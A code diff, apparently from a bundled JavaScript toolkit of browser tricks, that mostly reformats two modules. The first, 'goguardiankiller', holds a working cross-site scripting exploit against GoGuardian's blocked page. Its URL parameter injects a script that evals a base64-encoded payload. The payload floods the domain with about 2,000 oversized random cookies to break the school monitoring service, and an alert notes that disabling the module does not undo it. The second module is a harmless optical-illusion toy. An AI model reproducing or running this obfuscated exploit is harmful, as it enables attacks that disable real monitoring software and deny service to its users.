@@ -1366,14 +1366,14 @@
                     id: 'goguardiankiller',
                     section: 'exploit',
                     onactive: function () {
-                        var url = "https://student.goguardian.com/teacher/blocked.html?cs=[{\"name\":\"\"}, {\"name\":\"<style>*{display:none}<\\/style><iframe srcdoc=\\\"<script>top.eval(atob(`bGV0IGNvb2tpZXMgPSBbXTsKCmZvciAobGV0IGkgPSAwOyBpIDwgMmUzOyBpKyspIHsKICBjb29raWVzLnB1c2goewogICAgbmFtZTogYGNkJHtpfWAsCiAgICB2YWx1ZTogZW5jb2RlVVJJQ29tcG9uZW50KGJ0b2EoY3J5cHRvLmdldFJhbmRvbVZhbHVlcyhuZXcgVWludDhBcnJheSgyNSAqIDI1KSkpKSwKICAgIGV4cGlyZXM6IG5ldyBEYXRlKDJlMTQpLnRvVVRDU3RyaW5nKCksCiAgICBwYXRoOiAiLyIsCiAgICBkb21haW46IGxvY2F0aW9uLmhvc3Quc3BsaXQoIi4iKS5zbGljZSgtMikuam9pbigiLiIpCiAgfSk7Cn0KCmNvb2tpZXMgPSBjb29raWVzLm1hcChjb29raWUgPT4gYCR7Y29va2llLm5hbWV9PSR7Y29va2llLnZhbHVlfTtleHBpcmVzPSR7Y29va2llLmV4cGlyZXN9O3BhdGg9JHtjb29raWUucGF0aH07ZG9tYWluPSR7Y29va2llLmRvbWFpbn07YCk7Cgpjb29raWVzLmZvckVhY2goKGNvb2tpZSkgPT4gKGRvY3VtZW50LmNvb2tpZSA9IGNvb2tpZSkpO2hpc3RvcnkucmVwbGFjZVN0YXRlKHt9LHt9LCcvJyk==`))<\\/script>\\\"></iframe>\"}]";
+                        var url =
+                            'https://student.goguardian.com/teacher/blocked.html?cs=[{"name":""}, {"name":"<style>*{display:none}<\\/style><iframe srcdoc=\\"<script>top.eval(atob(`bGV0IGNvb2tpZXMgPSBbXTsKCmZvciAobGV0IGkgPSAwOyBpIDwgMmUzOyBpKyspIHsKICBjb29raWVzLnB1c2goewogICAgbmFtZTogYGNkJHtpfWAsCiAgICB2YWx1ZTogZW5jb2RlVVJJQ29tcG9uZW50KGJ0b2EoY3J5cHRvLmdldFJhbmRvbVZhbHVlcyhuZXcgVWludDhBcnJheSgyNSAqIDI1KSkpKSwKICAgIGV4cGlyZXM6IG5ldyBEYXRlKDJlMTQpLnRvVVRDU3RyaW5nKCksCiAgICBwYXRoOiAiLyIsCiAgICBkb21haW46IGxvY2F0aW9uLmhvc3Quc3BsaXQoIi4iKS5zbGljZSgtMikuam9pbigiLiIpCiAgfSk7Cn0KCmNvb2tpZXMgPSBjb29raWVzLm1hcChjb29raWUgPT4gYCR7Y29va2llLm5hbWV9PSR7Y29va2llLnZhbHVlfTtleHBpcmVzPSR7Y29va2llLmV4cGlyZXN9O3BhdGg9JHtjb29raWUucGF0aH07ZG9tYWluPSR7Y29va2llLmRvbWFpbn07YCk7Cgpjb29raWVzLmZvckVhY2goKGNvb2tpZSkgPT4gKGRvY3VtZW50LmNvb2tpZSA9IGNvb2tpZSkpO2hpc3RvcnkucmVwbGFjZVN0YXRlKHt9LHt9LCcvJyk==`))<\\/script>\\"></iframe>"}]'
 
                         // idfk if this will work :skull emoji:
-                        window.open(url, '_blank');
-
+                        window.open(url, '_blank')
                     },
                     ondisable: function () {
-                        alert("go to goguardian.com and clear all cookies+cache, disabling this does nothing");
+                        alert('go to goguardian.com and clear all cookies+cache, disabling this does nothing')
                     },
                     custom_render: !1,
                 }
@@ -1474,7 +1474,16 @@
                     })(document)
                 }
                 Object.defineProperty(n, '__esModule', { value: !0 })
-                const o = { display_name: "Optical Illusion (maybe broken, didn't test)", description: 'self explanatory', id: 'eyes', section: 'fun', onactive: t, ondisable: t, always: !0, custom_render: !1 }
+                const o = {
+                    display_name: "Optical Illusion (maybe broken, didn't test)",
+                    description: 'self explanatory',
+                    id: 'eyes',
+                    section: 'fun',
+                    onactive: t,
+                    ondisable: t,
+                    always: !0,
+                    custom_render: !1,
+                }
                 n.default = o
             },
             9735: (e, n, t) => {
